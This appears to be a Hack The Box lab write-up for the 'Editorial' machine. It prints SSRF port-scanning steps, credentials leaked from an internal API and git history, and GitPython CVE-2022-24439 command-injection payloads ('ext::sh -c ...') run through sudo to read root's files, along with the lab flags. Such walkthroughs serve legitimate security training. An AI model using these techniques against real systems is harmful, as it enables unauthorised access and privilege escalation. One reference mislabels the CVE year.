

Hello There! Its a great day to start pwning another box and in today's adventure lets pwn [Editorial](https://app.hackthebox.com/machines/Editorial).


![[Pasted image 20240921131418.png]]

Like always start with initial footholding scans on the `ip` with `nmap`


```bash
map -A -sV -T4 10.10.11.20
```

The breakdown of command is as follows 
- **`-A`**: Enables aggressive mode, which performs several advanced functions including OS detection, version detection, script scanning, and traceroute.
- **`-sV`**: Service version detection; it attempts to determine the version of services running on open ports.
- **`-T4`**: Timing template, where `T4` is faster than default. It sets the timing to "aggressive," speeding up the scan but potentially increasing the chance of missing details or detection.

We get the following scan results for the ip address.

```bash
┌──(dkvv㉿kali)-[~/Desktop/htb/editorial]
└─$ nmap -A -sV -T4  10.10.11.20 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-21 13:46 IST
Nmap scan report for 10.10.11.20
Host is up (0.29s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp   open     http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.97 seconds
```

There are multiple open and ruunning ports `ssh` and `http` and we can see from the results in the port `80` The scan did not follow a redirect to `http://editorial.htb`. This suggests that the web server is redirecting requests to the domain `editorial.htb`, since all htb ,machines are vhosts which may need to be added to your `local dns` (/etc/hosts) file for further testing.

Doing so we will able to access the webpage `editorial.htb`

![[Pasted image 20240921135929.png]]

Going through the available webpage the only page is `upload` because it opens up a whole new set of attack vectors. Inspecting the page source further we can find an interesting `javascript`

```javascript
<script>
          document.getElementById('button-cover').addEventListener('click', function(e) {
            e.preventDefault();
            var formData = new FormData(document.getElementById('form-cover'));
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/upload-cover');
            xhr.onload = function() {
              if (xhr.status === 200) {
                var imgUrl = xhr.responseText;
                console.log(imgUrl);
                document.getElementById('bookcover').src = imgUrl;
                document.getElementById('bookfile').value = '';
                document.getElementById('bookurl').value = '';
              }
            };
            xhr.send(formData);
          });
```

Its calling post on /upload-cover , on visiting it will redirect to /upload directory.Let's fire up the `burpsuite` and check

Upon filling the fields and clicking on preview, we can inspect the preview packet on `burpsuite` 

![[Pasted image 20240921143111.png]]

Forwarding the packet we get the following result which is a static image
![[Pasted image 20240921143152.png]]

![[Pasted image 20240921143309.png]]

This is a classic sign of [SSRF](https://portswigger.net/web-security/ssrf). We figured out the first step on how to get into the system, or at least how to get there.

Changing the parameter here doesn't give any thing else part the static image.

SSRF let an attacker direct and change a server's behavior toward a different server, even our own server.  
  
Since we can see that only  port 22 and 80 are open, we might be able to redirect localhost and find a route we haven't found yet.It is known as SSRF OUT OF BOUND.

Now we have make a call to localhost (to ourselves 127.0.0.1) and brute-force the endpoint
\
![[Pasted image 20240921150424.png]]

Intercept the packet in burp and select attack type to `battering ram`  and in payload fill the parameters such that it tests from port 1 - 65535 and commence attack

![[Pasted image 20240921151412.png]]

Then, use filters to get rid of the results that have the normal JPEG endpoint in the response. You should now get the `5000 port` because it has different length compared to all the other responses with a different endpoint in its response.

![[Pasted image 20240921161213.png]]

The response has a doc in it 
![[Pasted image 20240921161305.png]]

Visiting the endpoint it will download the file named in the response is as follows

```bash
──(dkvv㉿kali)-[~/Downloads]
└─$ cat a1f900ac-ed9f-4623-b461-f808af6ba4a7 | jq
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```

Obviously, we are bound to visiting all the API endpoints using `burpsuite` only `authors` had a file downloaded when visiting it

![[Pasted image 20240921170045.png]]


If you append the endpoint to the machine URL, you will download the file. which consists of credentials for the `ssh` port

```bash
┌──(dkvv㉿kali)-[~/Downloads]
└─$ cat aaa6c06a-75b9-4c0d-ae4b-1eafc0821110 
{"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."}
```

Let's login to the `ssh` port using these credentials

![[Pasted image 20240921170508.png]]

### Privilege escalation

After further checking we can see that there exists one more called `prod`


```bash
dev@editorial:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
<snip>
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
prod:x:1000:1000:Alirio Acosta:/home/prod:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dev:x:1001:1001::/home/dev:/bin/bash
fwupd-refresh:x:113:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```
 
 After further investigating we can find a hidden file `.git` in `apps` folder. I looked up the log folder and found some interesting data
 
```bash
commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -> master)
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:04:21 2023 -0500

    fix: bugfix in api port endpoint

commit dfef9f20e57d730b7d71967582035925d57ad883
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:01:11 2023 -0500

    change: remove debug and update api port

commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:51:10 2023 -0500

    feat: create api to editorial info
    
    * It (will) contains internal info about the editorial, this enable
       faster access to information.

commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:48:43 2023 -0500

    feat: create editorial app
    
    * This contains the base of this project.
    * Also we add a feature to enable to external authors send us their
       books and validate a future post in our editorial.
```


Among them the fourth one consists of the credentials for `prod` user.

```bash
dev@editorial:~/apps/.git$ git show 1e84a036b2f33c59e2390730699a488c65643d28
commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:51:10 2023 -0500

    feat: create api to editorial info
    
    * It (will) contains internal info about the editorial, this enable
       faster access to information.
       
<snip>

+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+    }) # TODO: replace dev credentials when checks pass
+
+# -------------------------------
+# Start program
+# -------------------------------
+if __name__ == '__main__':
+    app.run(host='127.0.0.1', port=5001, debug=True)

```

Let's use the following `prod` credentials to login and  we are in.

After few minutes of rummaging through the folders we can find that `prod`  is not in sudoer's list. So lets check what `sudo` commands can we perform using `prod`

```bash
prod@editorial:~$ sudo -l
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

From the result we can see that the python code can be executed with sudo access. We'll find out what it is.

```bash
rod@editorial:/$ cd /opt/internal_apps/clone_changes/
prod@editorial:/opt/internal_apps/clone_changes$ cat clone_prod_change.py 
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

This Python script is designed to automate the process of cloning a Git repository into a specified directory on a system.

git.Repo: This is from the GitPython library, which allows interaction with Git repositories.

- **Purpose**: This script automates the cloning of a Git repository.
- **Steps**:

1. Change the working directory to /opt/internal_apps/clone_changes.
2. Retrieve the Git repository URL from the command line arguments.
3. Initialize a bare Git repository in the current directory.
4. Clone the repository from the provided URL into a subdirectory named new_changes, with a specific Git configuration option.

One vulnerable package was discovered during analysis of the source files and packages using the pip3 list command. One RCE vulnerability, [CVE-2022-24439](https://nvd.nist.gov/vuln/detail/CVE-2022-24439), affects GitPython 3.1.29.

Let’s try the exploit mentioned in the POC I reference

```bash
prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /tmp/pwned'
Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from
    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone
    finalize_process(proc, stderr=stderr)
  File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process
    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c touch% /tmp/pwned new_changes
  stderr: 'Cloning into 'new_changes'...
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
'
prod@editorial:/opt/internal_apps/clone_changes$ cat /tmp/pwned
prod@editorial:/opt/internal_apps/clone_changes$ 
```

 We are seeing them error message about running python3, which means that the python file was run as the root user. So, don't bother about them.

Now let's try to get the root flag by tweaking the command to retrieve the root.txt contents from the /root directory.

```bash
prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >% /tmp/root'
Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from
    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone
    finalize_process(proc, stderr=stderr)
  File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process
    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c cat% /root/root.txt% >% /tmp/root new_changes
  stderr: 'Cloning into 'new_changes'...
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
```

Then viola! we got the root flag.

![[Pasted image 20240921181509.png]]


![[Pasted image 20240921181617.png]]


<details>
  <summary>Click to reveal the Flags</summary>
  User: bc61c72adc300eb72833f26b6a52b58f
  Root: 79f4aed6fd41a336019087815df6b042
</details>

### References 
1. **[SSRF](https://portswigger.net/web-security/ssrf)**: Server-Side Request Forgery (SSRF) allows an attacker to make requests from the server to unauthorized internal systems or services.

2. **[CVE-2023-24439](https://nvd.nist.gov/vuln/detail/CVE-2022-24439)**: A Git vulnerability that could allow attackers to execute arbitrary commands by exploiting a flaw in Git for certain repository URLs.

3. **[CVE PoC](https://github.com/gitpython-developers/GitPython/issues/1515)**: Proof of Concept (PoC) for a vulnerability in GitPython that demonstrates potential exploitation paths, possibly related to the unsafe handling of repository URLs.




